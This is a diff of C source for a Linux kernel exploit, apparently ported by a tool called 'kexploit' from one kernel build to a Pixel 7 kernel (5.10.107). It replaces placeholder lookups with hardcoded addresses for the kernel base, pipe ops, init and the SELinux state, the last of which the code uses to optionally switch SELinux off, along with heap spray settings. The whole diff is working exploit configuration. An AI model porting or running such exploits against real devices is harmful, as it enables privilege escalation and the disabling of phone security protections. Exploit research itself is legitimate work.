@@ -1,4 +1,8 @@
-__kexploit_src_metadata("{\"original_kernel_name\":\"ingots_5.10.66\",\"current_kernel_name\":\"ingots_5.10.66\"}")
+
+// Exploit adapted by kexploit
+// Original kernel name: ingots_5.10.66
+// Adaptation kernel name: pixel7_5.10.107
+
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -517,18 +521,18 @@ usize linear_base = 0;
 // this kernel does not have kmalloc-192, so object of interest goes in kmalloc-256
 #define SPRAY_SIZE 256
 
-#define KERNEL_BASE __kexploit_kernel_address("{\"address\":18446743799100080128,\"is_relative\":false}")
+#define KERNEL_BASE 0xffffffc010000000
 
 // on arm this symbol is called memstart_addr
-#define PAGE_OFFSET_BASE (__kexploit_kernel_address("{\"address\":18446743799138654616,\"is_relative\":false}") - KERNEL_BASE)
-#define PIPE_OPS_OFFSET (__kexploit_kernel_address("{\"address\":18446743799137015528,\"is_relative\":false}") - KERNEL_BASE)
-#define INIT_OFFSET (__kexploit_kernel_address("{\"address\":18446743799143906880,\"is_relative\":false}") - KERNEL_BASE)
+#define PAGE_OFFSET_BASE (0xffffffc012503450 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffc012362c68 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffc012ffc440 - KERNEL_BASE)
 
 // optinally define to turn off selinux
-#define SELINUX_STATE_OFFSET (__kexploit_kernel_address("{\"address\":18446743799146691352,\"is_relative\":false}") - KERNEL_BASE)
+#define SELINUX_STATE_OFFSET (0xffffffc01316b9a8 - KERNEL_BASE)
 
 // first 64 bit word of kernel image
-#define KERNEL_START_WORD __kexploit_kernel_data("{\"address\":18446743799100080128,\"num_bytes\":8,\"original_value\":1484710131542284877}")
+#define KERNEL_START_WORD 0x14b17fff91005a4d
 
 #define VMEMMAP_START 0xfffffffeffe00000
 #define LINEAR_BASE 0xffffff8000000000
